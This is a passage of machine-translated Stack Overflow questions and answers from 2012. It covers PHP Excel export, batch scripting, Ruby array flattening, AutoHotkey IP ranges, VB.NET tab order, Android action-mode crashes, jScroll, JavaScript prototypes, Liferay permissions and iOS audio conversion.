$result = mysql_query("SELECT * FROM `tbl_notes` WHERE `user_id` = '$user_id' ") or
    die(mysql_error());

include_once ("jdf.php");
$date = jdate('Y/n/j');

header("Content-Type: application/xls");
header("Content-Disposition: attachment; filename=$date.xls");
header("Pragma: no-cache");
header("Expires: 0");

$sep = "\t";

while ($row = mysql_fetch_row($result)) {
    $schema_insert = "";
    for ($j = 0; $j < mysql_numfields($result); $j++) {
        if (!isset($row)) {
            $schema_insert .= "NULL" . $sep;
        } else
            if ($row[$j] != "") {
                $schema_insert .= "$row[$j]" . $sep;
            } else {
                $schema_insert .= "" . $sep;
            }
    }
    $schema_insert = str_replace($sep . "$", "", $schema_insert);
    $schema_insert = preg_replace("/\r\n|\n\r|\n|\r/", " ", $schema_insert);
    $schema_insert .= "\t";
    print (trim($schema_insert));
    print "\n";
} 
```

我不知道如何强制 android 设备以 php 代码下载文件。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:47:42.950

在您的问题中，您必须区分两件事：

*   如何使用 php 从 mysql 数据库生成 excel 文件和
*   如何从安卓手机访问生成的excel文件。

Android 本身无法执行您的 php 脚本。

要使用 php 从 mysql 数据库生成 excel 文件，您必须将 php 文件放在可以被 php 解释器读取并且能够访问 mysql 数据库的位置。通常，php 在某些网络服务器上执行。然而，它也可以从 shell 执行它。如果它在某个网络服务器上执行，您可以使用任何浏览器访问您的脚本并下载 excel 文件。

要从安卓手机访问生成的 excel 文件，您可以使用安卓浏览器访问某些网络服务器上的 php 脚本。更复杂的方法是开发一个android应用程序并通过一些http rest应用程序下载excel。例如，您可以使用[HttpConnection](http://developer.android.com/reference/org/apache/http/HttpConnection.html)类。

# batch-file - 如何仅在根文件夹中的指定子文件夹上运行批处理脚本？

> ID：13572397
> 
> 赞同：1
> 
> 时间：2012-11-26T20:13:35.953
> 
> 标签：batch-file

我有一个包含子文件夹（1、2、3、4、5）的特定文件夹（mak）。我有一个批量查找​​和替换脚本，我只想在子文件夹 1,2 和 3 上运行。这怎么可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T11:45:10.570

您可以设置一个 varribel 系统，如果您可以告诉计算机这些是我想要搜索的文件，然后您可以使用 cd C:...your main file location\%your varible1% 然后让它循环，这样它就会将每个变量添加到另一个变量中，然后将其设置为创建临时文件，这样我就知道制作了哪个，看起来像这样

```
@echo off
Echo Max Numbers: 5
:setn
set /p n = 1
:start
 set /p V%n% = Enter File Path: 
:answer
set /p done = Is that all? (Y/N)
echo temp file > %done%.txt
if exist Y.txt goto File
if exist N.txt goto Varible%n%
goto answer
:varible1
echo %n%>%n%.txt
 if %n% = 1 set /p n = 2
goto start
:Varible2
echo %n%>%n%.txt
if %n% = 2 set /p n = 3
goto start
:Varible3 
echo %n%>%n%.txt
if %n% = 3 set /p n = 4
goto start
:Varible4
echo %n%>%n%.txt
if %n% = 4 set /p n = 5
goto start
:varible5
goto File
:file 
"Your file code here" 
```

此代码可能不起作用，这取决于您拥有的窗口类型。

# ruby - Ruby 将可枚举数组展平为多个子数组？

> ID：13572398
> 
> 赞同：0
> 
> 时间：2012-11-26T20:13:58.963
> 
> 标签：ruby, arrays, enumerable

我有以下代码：

```
>[['string', 'User'], Foo.all.map {|c| ["number", c.name]}, ['number', 'Average Time']]
=> [["string", "User"], [["number", "Bar1"], ["number", "Bar2"], ["number", "Bar3"]], ["datetime", "Average Time"]] 
```

我想做的是将传递的 Foo 可枚举数组简单地展平为：

```
=> [["string", "User"], ["number", "Bar1"], ["number", "Bar2"], ["number", "Bar3"], ["datetime", "Average Time"]] 
```

我尝试了以下方法，但它并没有达到我想要的效果：

```
>[['string', 'User'], Foo.all.map {|c| ["number", c.name]}.flatten, ['number', 'Average Time']]
=> [["string", "User"], ["number", "Bar1", "number", "Bar2", "number", "Bar3"], ["datetime", "Average Time"]] 
```

请注意，在测试时，您可以将`Fool.all.map`part替换`[["number", "Bar1"], ["number", "Bar2"], ["number", "Bar3"]]`为示例输出所示。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:40:11.340

使用[splat 运算符](http://endofline.wordpress.com/2011/01/21/the-strange-ruby-splat/)：

```
[
  ['string', 'User'], 
  *Foo.all.map { |c| ["number", c.name] }, 
  ['number', 'Average Time'],
] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:20:00.203

试试这个

```
([['string', 'User']] + Foo.all.map {|c| ["number", c.name]} + [['number', 'Average Time']]) 
```

# if-statement - 如何在 AutoHotkey 中识别 IP 范围

> ID：13572399
> 
> 赞同：1
> 
> 时间：2012-11-26T20:14:00.710
> 
> 标签：if-statement, ip, autohotkey, range

我正在使用的脚本有一个名为 SourceIP 的变量。我有一些用于 VPN 池的静态 IP 范围列表。如何设置搜索逻辑以确定源 IP 所在的 IP 池？

以下是示例详细信息：

源 IP = 15.15.7.49

VPNpool1 = 15.15.1.0 - 15.15.9.255

VPNPool2 = 15.15.10.0 - 15.15.19.255

通常，当我想查看一个值是否在值列表中时，我使用**If VARIABLE contains ITEM1,ITEM2,ITEMn**。此方法不适用于 VPN 池范围，因为我必须列出**每个**IP。我希望有人知道我如何才能完成这项工作。

也许是这样的：

```
If SourceIP in VPNPool1 

{

MsgBox The SourceIP is from VPNPool1

}

If SourceIP in VPNPool12

{

MsgBox The SourceIP is from VPNPool2

}

Else 

{

MsgBox The SourceIP is not in a VPNPool.

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:43:02.757

尝试这个。确保您拥有支持对象的最新 AutoHotkey 版本。

```
IP := "15.15.9.254"
Start := "15.15.1.0" 
End := "15.15.9.255"
if InIPRange(IP, Start, End)
    msgbox yes
else
    msgbox no

InIPRange(strIP, strStart, strEnd) {

    arrIPRanges := {}
    loop, parse, strStart, .
        arrIPRanges[A_Index, A_LoopField] := A_LoopField        
    loop, parse, strEnd, .
        arrIPRanges[A_Index, A_LoopField] := A_LoopField
    loop, parse, strIP, .
    {
        if arrIPRanges[A_Index].MinIndex() > A_LoopField
            return false
        if arrIPRanges[A_Index].MaxIndex() < A_LoopField
            return false
    }
    return true
} 
```

# vb.net - 如何在VB中按顺序设置文本框？

> ID：13572400
> 
> 赞同：1
> 
> 时间：2012-11-26T20:14:09.340
> 
> 标签：vb.net, textbox, key, mouseevent

我想按顺序制作文本框和其他输入值，所以我可以使用“Tab”按钮从一个移动到另一个。

目前我有 3 个用于日期输入的文本框，当我运行程序时，默认情况下它总是将光标设置为第 3 个文本框，而不是第 1 个。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:17:18.520

在 Visual Studio 中，您需要设置 Tab 键顺序。

为此，在表单设计器中，转到查看菜单，然后选择“Tab Order”

您将获得所有控件的小索引。只需按您想要使用 Tab 键在它们之间移动的顺序单击控件，您就可以完成设置。完成后，请务必通过返回查看菜单并取消选择 Tab Order 来关闭 Tab Order。

祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:18:12.497

查看`TabIndex`并通过您的菜单（取决于您的 VS 版本 - 我使用的是 2010） - 使用`View`>`Tab Order`

# php - 从字符串中反向提取数字，不带点

> ID：13572402
> 
> 赞同：-1
> 
> 时间：2012-11-26T20:14:18.457
> 
> 标签：php

我有一个字符串**6.7.0.0.1.3.6.6.1.6.1.e164.arpa**

我怎样才能只得到相反的数字

像**16166310076**。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:19:17.630

你可以这样做：

```
list( ,, $num) = explode( ".", strrev( "6.7.0.0.1.3.6.6.1.6.1.e164.arpa"), 3);
echo str_replace( '.', '', $num); 
```

它将反转的字符串转换为由三个元素组成的数组：

1.  `arpa`
2.  `e164`
3.  `6.7.0.0.1.3.6.6.1.6.1`

然后，`$num`设置为该数组的第三个元素，即数字的字符串，我将所有的替换为`.`空字符串。

这将打印`16166310076`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:30:12.933

```
strrev(implode('', array_filter(explode('.', $string), 'is_numeric'))); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:19:52.347

```
<?php
$number = '6.7.0.0.1.3.6.6.1.6.1.e164.arpa';
// Remove dots
$number = str_replace('.', '', $number); // 67001366161e164arpa
// Match number
preg_match("/[0-9]+/", $number, $matches); // array(67001366161)
$number = $matches[0]; // 67001366161
// Reverse number
$number = strrev($number); // 16166310076
// echo number
echo $number;
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T20:25:54.683

You can take advantage of PHP type juggling like so:

```
$result = strrev((int)str_replace('.', '', $str)); 
```

*   `str_replace` removes the dots giving you: `67001366161e164arpa`
*   type casting it to `(int)` will remove everything as of the first character that is not a number: `67001366161`.
*   `strrev` reverses it.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-26T20:27:43.207

这是一个非基于字符串的解决方案，应该更适合您的需求。

```
$string = '6.7.0.0.1.3.6.6.1.6.1.e164.arpa';
$parts = explode('.', $string);
$addr = array_reverse(array_slice($parts, 0, count($parts)-2));
echo implode('', $addr); // 16166310076 
```

# android - 上下文操作模式和 onClickListener 出现问题

> ID：13572403
> 
> 赞同：2
> 
> 时间：2012-11-26T20:14:20.237
> 
> 标签：android, onclick, contextual-action-bar

我正在尝试创建一个用于管理不同路径的活动。在左侧应该有一个侧边栏，您可以在其中选择不同的课程。在右侧应显示相应的路径属性。

当我长按一个项目时，应该启动上下文操作模式。在那里您可以选择多个项目并可以执行一些批处理操作，例如一次更新更多条目或从列表中删除它们。

问题是，每当我在操作模式下更改模拟器或真实设备的方向时，应用程序就会崩溃。我尝试了不同的方式来完成模式（mode.finish，布尔值在 onSaveInstances ...），但模式总是在 onCreate 恢复。

另一个奇怪的行为是指 PathSimpleCurosrAdapter。这是一个普通的 SimpleCursorAdapter，它根据底层数据编辑 ListView 子项，并将第一个子项着色为浅灰色。没有 MulitChoiceListener 一切正常，但有了它，我无法通过正常的 onItemClick 函数更改第一个元素的颜色。

我的主要活动

```
 public class MainActivity extends Activity {

    private int current_clicked=0; // marks last clicked item at lv_pahtlist
    private ListView lv_pathlist;
    private ListView lv_pathdetail;
    private SQLiteDatabase db;
    private boolean isInActionMode;

    @Override
    public void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_main);

       lv_pathlist =(ListView) findViewById (R.id.listview_main);
       lv_pathdetail=(ListView) findViewById (R.id.listview_path);

       // SQLHelper creates or retrieves database
       DBZugriff dbhelp=new DBZugriff(this, "Pfaddetails");
       db=dbhelp.getWritableDatabase();

       Cursor Cursor=db.query("ta_pathlist", new String[]{"pathname, refresh, saved", "_id"},
               "", null, null, null, null); 
       PathSimpleCursorAdapter adapter=new PathSimpleCursorAdapter(getBaseContext(),
               R.layout.list_item_img1, Cursor, new String[]{"pathname"}, new int[]{R.id.item_tv_path_detail},0);
       lv_pathlist.setAdapter(adapter);
       lv_pathlist.setBackgroundColor(Color.GRAY);

       Cursor cursor2=db.query("ta_pathattribute", new String[]{"_id","attribute_value"},
               "fk_path=1", null, null, null, null); 
       SimpleCursorAdapter adapter2=new SimpleCursorAdapter(getBaseContext(),
               R.layout.list_item2, cursor2, new String[]{"attribute_value"}, new int[]{R.id.list_item2_tv},0);
       lv_pathdetail.setAdapter(adapter2);

       //Contextmenu
       registerForContextMenu(lv_pathlist);
       lv_pathlist.setChoiceMode(ListView.CHOICE_MODE_MULTIPLE_MODAL);
       lv_pathlist.setMultiChoiceModeListener(new MultiChoiceModeListener() {

          public void onItemCheckedStateChanged(ActionMode mode, int position,
                                                 long id, boolean checked) {
                if (checked==true)
                    lv_pathlist.getChildAt(position).setBackgroundColor(Color.LTGRAY);
                else
                    lv_pathlist.getChildAt(position).setBackgroundColor(Color.GRAY);
           }

           public boolean onCreateActionMode(ActionMode mode, Menu menu) {
               MenuInflater inflater = mode.getMenuInflater();
               inflater.inflate(R.menu.activity_main_context, menu); 
               return true;
           }

           public void onDestroyActionMode(ActionMode mode) {
                   for(int i=0; i<lv_pathlist.getCount();i++)
                       lv_pathlist.getChildAt(i).setBackgroundColor(Color.GRAY);
                   //if possible: mark last clicked element
                   if(lv_pathlist.getChildAt(current_clicked)!=null)
                       lv_pathlist.getChildAt(current_clicked).setBackgroundColor(Color.LTGRAY);
           }

           public boolean onPrepareActionMode(ActionMode mode, Menu menu) {
               for (int i=0;i<lv_pathlist.getCount();i++)
                   lv_pathlist.getChildAt(i).setBackgroundColor(Color.GRAY);
               SparseBooleanArray checked= lv_pathlist.getCheckedItemPositions();
               for(int index = checked.size() - 1; index >= 0; index--)
                   lv_pathlist.getChildAt(index).setBackgroundColor(Color.LTGRAY);
               return false;
           }

           public boolean onActionItemClicked(ActionMode arg0, MenuItem arg1) {
               //Some actions
               return false;
           }
       });

       // change background color when item is checked/unchecked
       lv_pathlist.setOnItemClickListener(new OnItemClickListener() {
           //@Override
           public void onItemClick(AdapterView<?> parent, View view, int position, long id) {

               lv_pathlist.getChildAt(current_clicked).setBackgroundColor(Color.GRAY);
               lv_pathlist.getChildAt(position).setBackgroundColor(Color.LTGRAY);
               current_clicked=position;
           }
       });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

} 
```

PathSimpleCursorAdapter

```
 public class PathSimpleCursorAdapter extends SimpleCursorAdapter{

    public PathSimpleCursorAdapter(Context context, int layout, Cursor c,
            String[] from, int[] to, int flags) {
        super(context, layout, c, from, to, flags);
    }

    @Override
    public void bindView (View view, Context context, Cursor cursor)
    {
        /*
         * Der größte Teil der Arbeit wird von der Vatermethode erledigt
         */
        super.bindView(view, context, cursor);

        if(cursor.getInt(cursor.getColumnIndex("saved"))==1)
            view.findViewById(R.id.item_img_path_detail1).setVisibility(0);
        if(cursor.getInt(cursor.getColumnIndex("refresh"))==1)
            view.findViewById(R.id.item_img_path_detail2).setVisibility(0);

    }
    } 
```

活动布局

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" 
    android:orientation="horizontal">

    <ListView 
        android:id="@+id/listview_main"
        android:layout_weight="2"
        android:layout_height="match_parent"
        android:layout_width="0dp"    
        >   
    </ListView>

    <LinearLayout
        android:id="@+id/main_right"
        android:layout_width="0dp"
        android:layout_height="fill_parent"
        android:layout_weight="5"
        android:gravity="center_vertical|center_horizontal"
        android:orientation="vertical" >

        <ImageView
            android:id="@+id/Main_Image"
            android:layout_width="120dp"
            android:layout_height="120dp"
            android:layout_margin="20dp"
            android:maxHeight="120dp"
            android:maxWidth="120dp"
            android:src="@drawable/ic_launcher" />

        <Button 
            android:id="@+id/Button"
            android:layout_height="wrap_content"
            android:layout_width="wrap_content"
            android:text="@string/Button"/>

        <ListView
            android:id="@+id/listview_path"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:padding="50dp"
            android:listSelector="@android:color/transparent">
        </ListView>

    </LinearLayout>

   </LinearLayout> 
```

项目布局

```
 <?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >
    <TextView 
        android:id="@+id/item_tv_path_detail"
        android:layout_weight="8"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:gravity="center_vertical"
        android:padding="10dp"
        android:textSize="20dp"
        />
    <ImageView
        android:id="@+id/item_img_path_detail1"
        android:layout_weight="2"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:src="@drawable/content_attachment"
        android:visibility="invisible"
  />
        <ImageView
        android:id="@+id/item_img_path_detail2"
        android:layout_weight="2"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:src="@drawable/navigation_refresh"
        android:visibility="invisible"
  />

  </LinearLayout> 
```

日志猫说

```
11-26 20:23:49.685: E/AndroidRuntime(638): FATAL EXCEPTION: main
11-26 20:23:49.685: E/AndroidRuntime(638): java.lang.RuntimeException: Unable to start activity ComponentInfo{de.hsanhalt.inf.treeducation/de.hsanhalt.inf.treeducation.MainActivity}: java.lang.NullPointerException
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.handleRelaunchActivity(ActivityThread.java:3351)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.access$700(ActivityThread.java:123)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1151)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.os.Handler.dispatchMessage(Handler.java:99)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.os.Looper.loop(Looper.java:137)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.main(ActivityThread.java:4424)
11-26 20:23:49.685: E/AndroidRuntime(638):  at java.lang.reflect.Method.invokeNative(Native Method)
11-26 20:23:49.685: E/AndroidRuntime(638):  at java.lang.reflect.Method.invoke(Method.java:511)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
11-26 20:23:49.685: E/AndroidRuntime(638):  at dalvik.system.NativeStart.main(Native Method)
11-26 20:23:49.685: E/AndroidRuntime(638): Caused by: java.lang.NullPointerException
11-26 20:23:49.685: E/AndroidRuntime(638):  at de.hsanhalt.inf.treeducation.MainActivity$1.onPrepareActionMode(MainActivity.java:126)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.widget.AbsListView$MultiChoiceModeWrapper.onPrepareActionMode(AbsListView.java:5644)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.policy.impl.PhoneWindow$DecorView$ActionModeCallbackWrapper.onPrepareActionMode(PhoneWindow.java:2469)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.app.ActionBarImpl$ActionModeImpl.invalidate(ActionBarImpl.java:699)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.app.ActionBarImpl.startActionMode(ActionBarImpl.java:394)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.Activity.onWindowStartingActionMode(Activity.java:4380)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.policy.impl.PhoneWindow$DecorView.startActionMode(PhoneWindow.java:2171)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.policy.impl.PhoneWindow$DecorView.startActionModeForChild(PhoneWindow.java:2158)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.startActionModeForChild(ViewGroup.java:571)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.startActionModeForChild(ViewGroup.java:571)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.startActionModeForChild(ViewGroup.java:571)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.View.startActionMode(View.java:3607)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.widget.AbsListView.onRestoreInstanceState(AbsListView.java:1622)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.View.dispatchRestoreInstanceState(View.java:9939)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.dispatchThawSelfOnly(ViewGroup.java:2338)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.widget.AdapterView.dispatchRestoreInstanceState(AdapterView.java:778)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2324)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2324)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.view.View.restoreHierarchyState(View.java:9917)
11-26 20:23:49.685: E/AndroidRuntime(638):  at com.android.internal.policy.impl.PhoneWindow.restoreHierarchyState(PhoneWindow.java:1600)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.Activity.onRestoreInstanceState(Activity.java:906)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.Activity.performRestoreInstanceState(Activity.java:878)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.Instrumentation.callActivityOnRestoreInstanceState(Instrumentation.java:1100)
11-26 20:23:49.685: E/AndroidRuntime(638):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1934)
11-26 20:23:49.685: E/AndroidRuntime(638):  ... 12 more 
```

# jquery - 带有 jScroll 的样式滚动条

> ID：13572405
> 
> 赞同：2
> 
> 时间：2012-11-26T20:14:30.570
> 
> 标签：jquery, html

我一直在尝试在为朋友安装的主题上使用 jScroll 设置一些滚动条的样式，但它正在返回

```
Uncaught TypeError: Cannot read property 'offsetHeight' of undefined 
```

我尝试了另一个名为 tinyScrollbar 的 jQuery 插件，它也在做同样的事情。我是 ！确定是什么问题=。我可以用 CSS 改变它，但它在 Firefox 中不起作用，这真的很烦人。任何想法为什么它不起作用？

网址：[http ://spicyjentertainment.com/welcome.html](http://spicyjentertainment.com/welcome.html)

这 = = 假设滚动的 div

```
<div class="wrapper" id="scrl"> 
```

和 CSS

```
#scrl {
    height:150px;
    overflow:hidden;

}
#scrl:hover {
    overflow-y:auto;
} 
```

编辑

```
var initDrag = function()
            {
                ceaseAnimation();
                currentOffset = $drag.offset(false);
                currentOffset.top -= dragPosition;
                maxY = trackHeight - $drag[0].offsetHeight;
Uncaught TypeError: Cannot read property 'offsetHeight' of undefined
                mouseWheelMultiplier = 2 * settings.wheelSpeed *     maxY / contentHeight;
            }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T08:25:17.070

tinyscrollbar 需要存在 div 结构。您只有 1 个包装 div。阅读说明书。

```
 <div id="yourscrollbar">
    <div class="scrollbar"><div class="track"><div class="thumb"><div class="end"></div></div></div></div>
    <div class="viewport">
        <div class="overview">

tekst..

        </div>
    </div>
</div> 
```

# javascript - JavaScript 使用构造函数

> ID：13572407
> 
> 赞同：2
> 
> 时间：2012-11-26T20:14:33.163
> 
> 标签：javascript, object, private

我的页面（myScript.js）中包含以下脚本。

```
 function constr(args) {
        var param1 = args;

        function drawTable(element, tableRows) {
           // code that creates table with rows = tableRows and appends table to the passed element
        }

        drawContainer(); // call to and extended functionality
    }

var obj = new constr(10); 
```

但是我需要通过其他一些私有方法来扩展 obj。这些方法将从另一个脚本 (myScript2.js) 加载，其中一些必须覆盖 constr 中的一些私有方法。扩展方法也应该能够与 param1 和 constr 中的其他私有变量一起工作。理想情况下，一切都是私人的。

在 myScript2.js 我应该有类似的东西

```
constr.prototype = (function() {
   return {
     constructor:constr,
     drawContainer: function() {
         var container = document.createElement("DIV");

         document.append(container);
         drawTable(container, param1);
     }
   }
})(); 
```

通过执行以下原型，我假设通过另一个私有类-“drawContainer”扩展 constr 函数，并且能够从原始 constr 函数调用 drawTable 并访问 param1。

以下示例不起作用。我为什么这样做的想法是我想要一个 js 对象的模块，它在需要时向页面加载额外的功能。

# java - 在 Liferay 的文档和媒体 portlet 中全局过滤文件

> ID：13572409
> 
> 赞同：1
> 
> 时间：2012-11-26T20:14:39.417
> 
> 标签：java, liferay, portlet, liferay-6

我的 Liferay 组织是这样设置的：

```
North America
      |
   |     |
 Dept1  Dept2 
```

我想做的是允许 Dept1 和 Dept2 查看在北美发布的任何文档（只读），但阻止 Dept1 查看 Dept2 的文档，反之亦然。

例如，将在北美发布假期申请表，Dept1 和 Dept2 都应该能够阅读但不能修改。但是，如果 Dept1 发布 Dept1 高尔夫锦标赛的报名表，则 Dept2 应该无法查看此信息。

通过创建多个站点，我成功地设置了类似的东西，但我希望能够在同一个 portlet 中查看所有这些文件，而不是用户必须在他们的 Dept 站点和北美站点之间切换。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-27T18:51:44.943

好的，我自己已经实现了类似的东西（这是我能弄清楚如何做到这一点的唯一方法）。

1) 创建两个常规角色，每个部门一个

![在此处输入图像描述](../Images/8086c28f346d78eb46b98a6b8e94b417.png)

2) 为每个用户分配适当的新角色

![在此处输入图像描述](../Images/e4ae2ddeff303b3defb7aeafaa01d8d0.png)

![在此处输入图像描述](../Images/580e595cfdee83c26cf92bd908c75d2d.png)

3）在文档和媒体中创建您的文档/媒体/文件夹（例如 Dept. 1 Files / Dept. 2 Files 文件夹）

![在此处输入图像描述](../Images/270b4428c171fb5c60c25eeed2223faf.png)

4) 定义他们的权限 - 请参阅上图以了解单击位置 - （例如，对于 Dept. 1 Files 文件夹，取消选中 Department 2 角色的所有内容，同时确保客人不能做任何事情）

![在此处输入图像描述](../Images/9107dcfc6774236635bdd89098642578.png)

5）对于全局文件夹（北美），只需设置权限，以便两个角色都可以拥有完全权限

希望我对您的理解正确，这会有所帮助。

# ios - AudioConverterFillComplexBuffer 与 Internet 流式 mp3 配合使用

> ID：13572411
> 
> 赞同：2
> 
> 时间：2012-11-26T20:14:42.427
> 
> 标签：ios, mp3, converter

我目前正在通过 Internet 传输 mp3 音频。我正在使用 AudioFileStream 解析来自 CFReadStreamRef 的 mp3 流，使用 AudioConverterFillComplexBuffer 解码 mp3 并将转换后的 PCM 数据复制到环形缓冲区中，最后使用 RemoteIO 播放 PCM。

我目前面临的问题是 AudioConverterFillComplexBuffer 总是返回 0（没有错误），但转换结果似乎不正确。在细节上，我可以注意到，

A. UInt32 *ioOutputDataPacketSize 保持与我发送的相同值。

B. convertData.mBuffers[0].mDataByteSize 总是设置为输出缓冲区的大小（不管缓冲区有多大）。

C. 我只能听到输出数据的咔嗒声。

以下是我渲染音频的程序。同样的过程适用于我的音频队列实现，所以我相信我在调用 AudioConverterFillComplexBuffer 或 AudioConverterFillComplexBuffer 回调的地方都没有错。

我在这个问题上被困了很长时间。任何帮助将不胜感激。

1.  打开一个音频文件流。

    // 创建音频文件流解析器 AudioFileTypeID fileTypeHint = kAudioFileMP3Type;
    AudioFileStreamOpen(self, MyPropertyListenerProc, MyPacketsProc, fileTypeHint, &audioFileStream);

2.  在回调函数（“MyPacketsProc”）中处理解析的数据。

    void MyPacketsProc(void * inClientData, UInt32 inNumberBytes, UInt32 inNumberPackets, const void * inInputData, AudioStreamPacketDescription *inPacketDescriptions) { @synchronized(self) { // 初始化音频转换器。if (!audioConverter) AudioConverterNew(&asbd, &asbd_out, &audioConverter);

    ```
     struct mp3Data mSettings;
        memset(&mSettings, 0, sizeof(mSettings));

        UInt32 packetsPerBuffer = 0;
        UInt32 outputBufferSize = 1024 * 32; // 32 KB is a good starting point.
        UInt32 sizePerPacket = asbd.mBytesPerPacket;

        // Calculate the size per buffer.
        // Variable Bit Rate Data.
        if (sizePerPacket == 0)
        {
            UInt32 size = sizeof(sizePerPacket);
            AudioConverterGetProperty(audioConverter, kAudioConverterPropertyMaximumOutputPacketSize, &size, &sizePerPacket);

            if (sizePerPacket > outputBufferSize)
                outputBufferSize = sizePerPacket;

            packetsPerBuffer = outputBufferSize / sizePerPacket;
        }
        //CBR
        else
            packetsPerBuffer = outputBufferSize / sizePerPacket;

        // Prepare the input data for the callback.
        mSettings.inputBuffer.mDataByteSize = inNumberBytes;
        mSettings.inputBuffer.mData = (void *)inInputData;
        mSettings.inputBuffer.mNumberChannels = 1;
        mSettings.numberPackets = inNumberPackets;
        mSettings.packetDescription = inPacketDescriptions;

        // Set up our output buffers
        UInt8 * outputBuffer = (UInt8*)malloc(sizeof(UInt8) * outputBufferSize);
        memset(outputBuffer, 0, outputBufferSize);

        // describe output data buffers into which we can receive data.
        AudioBufferList convertedData;
        convertedData.mNumberBuffers = 1;
        convertedData.mBuffers[0].mNumberChannels = 1;
        convertedData.mBuffers[0].mDataByteSize = outputBufferSize;
        convertedData.mBuffers[0].mData = outputBuffer;

        // Convert.
        UInt32 ioOutputDataPackets = packetsPerBuffer;
        OSStatus result = AudioConverterFillComplexBuffer(audioConverter,                
                                                          converterComplexInputDataProc, 
                                                          &mSettings,                          
                                                          &ioOutputDataPackets,          
                                                          &convertedData,            
                                                          NULL                 
                                                          );

        // Enqueue the ouput pcm data.
        TPCircularBufferProduceBytes(&m_pcmBuffer, convertedData.mBuffers[0].mData, convertedData.mBuffers[0].mDataByteSize);
        free(outputBuffer);
    } 
    ```

    }

3.  从其回调函数（“converterComplexInputDataProc”）向音频转换器提供数据。

OSStatus converterComplexInputDataProc(AudioConverterRef inAudioConverter, UInt32* ioNumberDataPackets, AudioBufferList* ioData, AudioStreamPacketDescription** ioDataPacketDescription, void* inUserData) { struct mp3Data *THIS = (struct mp3Data* ) inUserData;

```
if (THIS->inputBuffer.mDataByteSize > 0)
{
    *ioNumberDataPackets = THIS->numberPackets;
    ioData->mNumberBuffers = 1;
    ioData->mBuffers[0].mDataByteSize = THIS->inputBuffer.mDataByteSize;
    ioData->mBuffers[0].mData = THIS->inputBuffer.mData;
    ioData->mBuffers[0].mNumberChannels = 1;

    if (ioDataPacketDescription)
        *ioDataPacketDescription = THIS->packetDescription;
}
else
    *ioDataPacketDescription = 0;

return 0; 
```

}

1.  使用 RemoteIO 组件播放。

2.  输入和输出 AudioStreamBasicDescription。

**输入：**

采样率：16000 格式 ID：.mp3

格式标志：0

每个数据包的字节数：0

每包帧数：576

每帧字节数：0

每帧通道数：1

每通道位数：0

**输出：**

采样率：44100

